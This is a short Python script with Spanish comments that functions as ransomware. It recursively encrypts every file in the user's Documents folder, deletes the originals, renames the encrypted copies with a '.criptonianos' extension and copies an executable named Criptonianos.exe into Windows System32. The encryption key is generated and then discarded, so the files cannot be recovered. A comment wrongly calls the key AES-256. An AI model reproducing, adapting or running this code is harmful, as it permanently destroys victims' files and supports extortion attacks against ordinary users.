import os
import shutil
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

winpath = os.environ['WINDIR'] + "\\System32\\"
def cifrarArchivos():
    # Obtiene la ruta a la carpeta "Documentos" del usuario actual
    #ruta_documentos = os.path.expanduser("~\\Documents")
    ruta_documentos = os.path.expanduser("~\\Documents")

    # Ahora puedes usar la variable 'ruta_documentos' para acceder a la carpeta de documentos
    print(f"Ruta a la carpeta 'Documentos' del usuario actual: {ruta_documentos}")

    rutas_de_archivos = []


    # Recorre el directorio y sus subdirectorios
    for carpeta_actual, subcarpetas, archivos in os.walk(ruta_documentos):
        for archivo in archivos:
            # Genera la ruta completa del archivo
            ruta_archivo = os.path.join(carpeta_actual, archivo)
            # Agrega la ruta del archivo a la lista
            rutas_de_archivos.append(ruta_archivo)

    # Ahora, rutas_de_archivos contiene todas las rutas de los archivos en el directorio y sus subdirectorios
    for ruta in rutas_de_archivos:
        print(ruta)


    # Genera una clave AES-256 aleatoria
    clave_aes = Fernet.generate_key()

    # Crea un objeto Fernet con la clave
    cipher_suite = Fernet(clave_aes)

    for archivo in rutas_de_archivos:
        # Lee el contenido del archivo
        with open(archivo, "rb") as file:
            contenido = file.read()

        # Cifra el contenido del archivo
        contenido_cifrado = cipher_suite.encrypt(contenido)

        # Ruta al archivo cifrado donde se guardará el contenido cifrado
        archivo_cifrado = archivo + ".criptonianos"

        # Guarda el contenido cifrado en un archivo
        with open(archivo_cifrado, "wb") as file:
            file.write(contenido_cifrado)
        os.unlink(archivo)

        print("El archivo se ha cifrado correctamente.")

rutaEsteArchivo = os.getcwd() + "\\Criptonianos.exe"
cifrarArchivos()
shutil.copy(rutaEsteArchivo,winpath)
